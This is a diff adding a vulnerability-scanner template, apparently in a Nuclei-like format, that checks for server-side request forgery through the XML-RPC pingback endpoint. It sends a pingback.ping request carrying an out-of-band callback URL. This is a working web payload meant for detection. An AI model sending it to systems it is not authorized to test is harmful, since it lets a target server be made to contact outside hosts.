@@ -1,0 +1,33 @@
+id: xmlrpc-pingback-ssrf
+brief:
+    title: XMLRPC Pingback SSRF
+    by: geeknik
+    level: high
+    about: XMLRPC Pingback leads to SSRF.
+    label:
+        - xmlrpc
+        - hackerone
+        - ssrf
+        - generic
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/xmlrpc/pingback'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      body: |-
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+        <methodName>pingback.ping</methodName>
+        <params>
+        <param>
+        <value>http://{{interactsh-url}}</value>
+        </param>
+        </params>
+        </methodCall>
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
